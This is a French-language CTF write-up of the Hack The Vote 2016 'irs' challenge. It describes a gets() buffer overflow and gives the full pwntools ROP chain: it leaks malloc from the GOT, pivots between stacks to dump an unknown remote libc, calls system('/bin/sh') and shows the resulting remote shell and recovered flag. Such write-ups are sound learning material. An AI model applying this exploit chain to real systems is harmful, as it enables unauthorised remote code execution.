---
layout: post
title: "Hack The Vote 2016 CTF"
date: lundi 7 novembre 2016, 08:13:50 (UTC+0100)
comments: true
categories: wu
---
Le binaire presente les caractéristiques suivantes:
```
Filename                 irs
File format              ELF32
Architecture             x86
Endianess                little endian
Entry point              0x8048540
Loadables segments       2
Sections                 34

NX bit                   enabled
SSP                      disabled
Relro                    full
RPATH                    no rpath
RUNPATH                  no runpath
PIE                      disabled
```
Si on analyse le binaire, on constate l'appel de la fonction gets dans la fonction edit_return. On peut le constater en répondant «ABCDEFGHIJKLMNOPQRSTUVWXYZ@@AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPQQRRSSTTUUVVWWXXYYZZ@@@AAABBBCCCDDDEEEFFF» à la question «y/n» lors de l'édition d'un contribuable, sous gdb on obtient:

Your changes have been recorded!
```
Program received signal SIGSEGV, Segmentation fault.
--------------------------------------------------------------------------[regs]
  EAX: 0x00000022  EBX: 0xf7fac000  ECX: 0xffffffff  EDX: 0xf7fad878  o d I t S z a P c 
  ESI: 0x00000000  EDI: 0x00000000  EBP: 0x59585756  ESP: 0xffffd050  EIP: 0x4140405a
  CS: 0023  DS: 002b  ES: 002b  FS: 0000  GS: 0063  SS: 002bError while running hook_stop:
Cannot access memory at address 0x4140405a
0x4140405a in ?? ()
```
Cela nous donne bien un buffer overflow sur au niveau de Z@@A, pour être précis, on a un tampon de remplissage ABCDEFGHIJKLMNOPQRSTU suivi de l'écrasement de <EBP> puis <EIP> et la suite.

Le mot de passe de Donald Trump est flag_is_here_on_server!!.

On va donc essayer de prendre un shell.

Le prelude du programme est le suivant:
```
chaine=PAD
chaine+=p32(nom1)	<---- au pif
chaine+=p32(puts_plt)	<---- affiche ce qui est pointé par
chaine+=p32(pop1)	      malloc_got
chaine+=p32(malloc_got)
chaine+=p32(puts_plt)	<---- affiche «Deductible»
chaine+=p32(pop1)
chaine+=p32(deductible)
chaine+=p32(puts_plt)	<---- reaffiche malloc_got 
chaine+=p32(pop1)
chaine+=p32(malloc_got)
chaine+=p32(gets_plt)	<---- lit la pile suivante
chaine+=p32(pop1)
chaine+=p32(pile)	<---- à l'endroit pile (0x804b880)
chaine+=p32(puts_plt)	<---- affichage de cette pile
chaine+=p32(pop1)
chaine+=p32(pile)
chaine+=p32(pop_ebp)	<---- on passe sur cette pile
chaine+=p32(pile)
chaine+=p32(leave)
rep=send("eductible",chaine)
```
La fonction send ci dessous effectue le bufferoverflow et renvoit la réponse dès la réception du mot attente ("Deductible", "Income" ... vont servir de balises)
```
def send(attente,test): 
    p.send("1\n")
    time.sleep(TIME)

    print p.recvuntil(": ")
    p.send("m\n")
    time.sleep(TIME)
    print p.recvuntil(": ")
    p.send("m\n")
    time.sleep(TIME)
    print p.recvuntil(": ")
    p.send("m\n")
    time.sleep(TIME)
    print p.recvuntil(": ")
    p.send("m\n")
    print p.recvuntil("m")
    p.send("3\n")
    time.sleep(TIME)

    print p.recvuntil(": ")
    p.send("m\n")
    time.sleep(TIME)
    print p.recvuntil(": ")
    p.send("m\n")
    time.sleep(TIME)
    print p.recvuntil(": ")
    p.send("1\n")
    time.sleep(TIME)
    print p.recvuntil(": ")
    p.send("1\n")
    time.sleep(TIME)
    print p.recvuntil("y/n")
    p.send(test+"\n")
    time.sleep(TIME)
    if (len(attente) > 0):
        try:
            readbuffer=p.recvuntil(attente)
            return(readbuffer)
        except:
            readbuffer=p.recvall(TIME)
            return readbuffer
    else:
        readbuffer=p.recvall(TIME)
        return readbuffer
```

après ce prélude, en faisant
```
#time.sleep(20)
malloc=word(rep[36:36+4])
print "Malloc=",hex(malloc)
```
malloc contient l'adresse de malloc dans la libc qui devrait permettre d'obtenir celle de «system». L'execution de 
```
def getsystem(cmd):
    chaine=p32(pile)
    chaine+=p32(system)	<--- appel de system
    chaine+=p32(pop1)
    chaine+=p32(pile+16)
    chaine+=cmd+"\x00"	<--- pour executer la commande cmd
    chaine+="\n"
    p.send(chaine)
    return()

getsystem("/bin/sh")
#print p.recvall(1)
p.interactive()
```

Souci: cette fameuse adresse system. La libc n'est pas dans la libc-database, il faut donc faire un dump de cette libc. Mais la connexion n'est pas fameuse, le mieux est de boucler en conservant le plus possible la connexion (qui coupe au bout de 30s). On va donc boucler en switchant entre deux piles: Ce sont les deux fonctions getadd1 et getadd2 qui font cela:
```
def getadd1(adr):
    chaine=p32(pile)
    chaine+=p32(puts_plt)	<--- affiche deductible
    chaine+=p32(pop1)
    chaine+=p32(deductible)
    chaine+=p32(puts_plt)	<--- lit adr jusqu'au premier 00
    chaine+=p32(pop1)
    chaine+=p32(adr)
    chaine+=p32(puts_plt)	<--- affiche Income
    chaine+=p32(pop1)
    chaine+=p32(income)
    chaine+=p32(gets_plt)	<--- Fabrique pile2 par gets
    chaine+=p32(pop1)
    chaine+=p32(pile2)
    chaine+=p32(puts_plt)
    chaine+=p32(pop1)
    chaine+=p32(correct)	<--- affiche correct
    chaine+=p32(pop_ebp)	<--- switche sur la pile2
    chaine+=p32(pile2)
    chaine+=p32(leave)
    chaine+="\n"
    p.send(chaine)
    recu=p.recvuntil("Income")
    buf=recu[recu.index("Deductible")+17:recu.index("Income")-1]+"\x00"
# buf contient la partie utile de la mémoire
    print 'len buf=',len(buf)
    return(buf)

# fonction sysmétrique switchant de pile2 à pile

def getadd2(adr):
    chaine=p32(pile2)
    chaine+=p32(puts_plt)
    chaine+=p32(pop1)
    chaine+=p32(deductible)
    chaine+=p32(puts_plt)
    chaine+=p32(pop1)
    chaine+=p32(adr)
    chaine+=p32(puts_plt)
    chaine+=p32(pop1)
    chaine+=p32(income)
    chaine+=p32(gets_plt)
    chaine+=p32(pop1)
    chaine+=p32(pile)
    chaine+=p32(puts_plt)
    chaine+=p32(pop1)
    chaine+=p32(correct)
    chaine+=p32(pop_ebp)
    chaine+=p32(pile)
    chaine+=p32(leave)
    chaine+="\n"
    p.send(chaine)
    recu=p.recvuntil("Income")
    buf=recu[recu.index("Deductible")+17:recu.index("Income")-1]+"\x00"
    print 'len buf=',len(buf)
    return(buf)
```

La lecture de la mémoire se fait par
```
l=0
long=0x1000	<---- longueur voulue
offset=0x00041000
buffer=""
while(l<long):
    OK=0
    nessai=5
    while(OK==0):
        p=remote(host,port)
        try:
            p.recvuntil("Trump")
            chaine=PAD
            chaine+=p32(nom1)
            chaine+=p32(puts_plt)
            chaine+=p32(pop1)
            chaine+=p32(malloc_got)
            chaine+=p32(puts_plt)
            chaine+=p32(pop1)
            chaine+=p32(deductible)
            chaine+=p32(puts_plt)
            chaine+=p32(pop1)
            chaine+=p32(malloc_got)
            chaine+=p32(gets_plt)
            chaine+=p32(pop1)
            chaine+=p32(pile)
            chaine+=p32(puts_plt)
            chaine+=p32(pop1)
            chaine+=p32(pile)
            chaine+=p32(pop_ebp)
            chaine+=p32(pile)
            chaine+=p32(leave)
            rep=send("eductible",chaine)
            malloc=word(rep[36:36+4])
            print "Malloc=",hex(malloc)
    # zone où on veut lire	    
            zone_a_lire=malloc-0x00075b60+ offset
            print 'delta=',hex(0*16)	   <--- pour s'y retrouver
            while(l<long):
                buf=getadd1(zone_a_lire+l)
                dump(zone_a_lire+l,buf)	   <--- affichage
                buffer=buffer+buf
		lp=len(buf)
                buf=getadd2(zone_a_lire+l+lp)
                dump(zone_a_lire+l+lp,buf)	<--- idem
                l=len(buffer)
                
            OK=1	<--- FINI!!
        except:			<--- cas où la connexion se coupe
            OK=0
            nessai=nessai-1	<--- shoot again!
            if (nessai==0):
                nessai=5
                buffer=buffer+"\xff"
                l=len(buffer)
        p.close()
    
fic=open("libc6","w")		<---- on enrgistre le truc...
fic.write(buffer)
fic.close()
```

Cela permet de trouver un offset_system valant 0x00040440.
On ontient enfin la session shell:
```
francois@athos:~/BFF/Pwn2016$ python irs3.py 1
[+] Opening connection to irs.pwn.republican on port 4127: Done

Enter the name: 
Enter the password: 
Enter the income: 
Enter the deductions: 
Thank you for doing your civic duty m
!
Welcome to the IRS!
How may we serve you today?
1. File a tax return
2. Delete a tax return
3. Edit a tax return
4. View a tax return
5. Exit

Tax returns on file:
0 - Donald Trump
1 - m
Enter the name of the file to edit: 
Enter the password: 
Enter the new income: 
Enter the new deductible: 
Is this correct?
Income: 1
Deductible: 1
y/n
Malloc= 0xf7611060
[*] Switching to interactive mode
: %d

`\x10a�@`
$       \x80\xb8\x0@\xb9]���\x90\xb8\x0/bin
$ ls -al
total 100644
drwxr-xr-x 2 ubuntu ubuntu      4096 Nov  6 02:01 .
drwxr-xr-x 6 ubuntu ubuntu      4096 Nov  5 05:05 ..
-rwxr-xr-x 1 ubuntu ubuntu     15408 Nov  5 00:22 main
-rw------- 1 ubuntu ubuntu 103026003 Nov  7 00:39 nohup.out
-rwxr-xr-x 1 ubuntu ubuntu       130 Nov  5 05:05 setup.sh
$  
```

AND NO FLAG!!!!! Blood and guts!

Bon, en fait sournoisement, le binaire n'est pas le même et le flag est le mot sde passe de Trump sur le serveur. Ayant le shell on peut faire
```
$  strings main | grep flag -A5 -B5
PTRh`
QVh9
Dona
ld T
rump
flag
{c4n
_1_g
3t_a
_r3f
und}
[...]
```
et on obtient flag{c4n_1_g3t_a_r3fund}.

Un CTF qui me laisse amer!!
